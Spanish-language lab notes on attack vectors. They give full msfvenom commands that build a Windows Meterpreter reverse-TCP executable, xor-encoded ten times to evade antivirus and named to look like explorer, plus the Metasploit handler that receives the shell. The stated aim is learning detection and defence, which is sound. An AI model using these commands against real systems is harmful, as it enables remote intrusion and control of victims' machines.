# Vectores de ataque

En este laboratorio analizamos cómo funcionan los vectores de ataque generando un payload en un entorno controlado y observando su comportamiento con Metasploit. 
Para ello se deshabilitó temporalmente el antivirus y se creó un ejecutable con msfvenom junto a un handler configurado para la conexión inversa. 
El objetivo no es atacar sistemas reales, sino comprender las técnicas, herramientas y flujos usados en ciberseguridad ofensiva para mejorar la capacidad de detección y defensa.

[!NOTE]
** Para esta practica se ha tenido que deshabilitar el antivirus de windows. **

# Crear payload

```bash
> /usr/bin/msfvenom \ # Utilidad con la que creamos el exe
     -a x64 \ # Arquitectura de nustro .exe
     --platform Windows \ # plataforma para la que vamos a crear nuestro .exe 
     -p windows/x64/meterpreter/reverse_tcp \ # Selecciona un payload Meterpreter que se conecta de vuelta al atacante mediante TCP inverso.
     -e x64/xor # Usa el codificador xor para ofuscar el payload y dificultar su detección por sistemas de defensa (antivirus, etc).
     -b '\x00' \ # Excluye el byte 0x00 (NULL), que puede romper ejecutables.
     -i 10  \ # Aplica el codificador 10 veces para aumentar la ofuscación
     LHOST=10.0.0.3 \ # IP del atacante a la que el payload intentará conectarse cuando de ejecute.
     LPORT=4444 \ # Puerto del atacante al que el payload hará la conexión inversa.
     -f exe \ # Formato del archivo de salida: ejecutable (.exe).
     -o explorerp.exe # Nombre del archivo generado.
```
```bash
> msfconsole -q # Abrimos consola de Metaexploit

#Configuramos el manejador del exploit

> use exploit/multi/handler # Configuramos el manejador
> set LHOST 10.0.0.3 # Configuramos ip del nuestro equipo atacante
> set LPORT 4444  # Puerto donde vamos a escuchar.
> set PAYLOAD windows/x64/meterpreter/reverse_tcp # PAYLOAD con el que creamos el ejecutable
> exploit # Empezamos a escuchar
```

# Artículos y Videos
  * https://keepcoding.io/blog/comandos-de-meterpreter/
  * https://es.scribd.com/document/467898739/Listado-comandos-Basicos-meterpreter-SF
  * https://elhacker.info/Cursos/OpenWebinars%20Hacking%20Tools%20Blue%20Team/Metasploit_100_.pdf
  * https://www.youtube.com/watch?v=VWeYLA58Vt8
  * https://labex.io/es/tutorials/linux-linux-nc-netcat-command-with-practical-examples-422835
  * https://www.startupdefense.io/es-us/blog/what-is-dwell-time-for-cybersecurity-e
  * https://www.zonamovilidad.es/las-empresas-tardan-13-horas-de-media-en-detectar-una-amenaza.html
  * https://www.itdigitalsecurity.es/endpoint/2021/09/hora-y-media-es-el-tiempo-que-tarda-un-ciberdelincuente-en-conseguir-su-objetivo






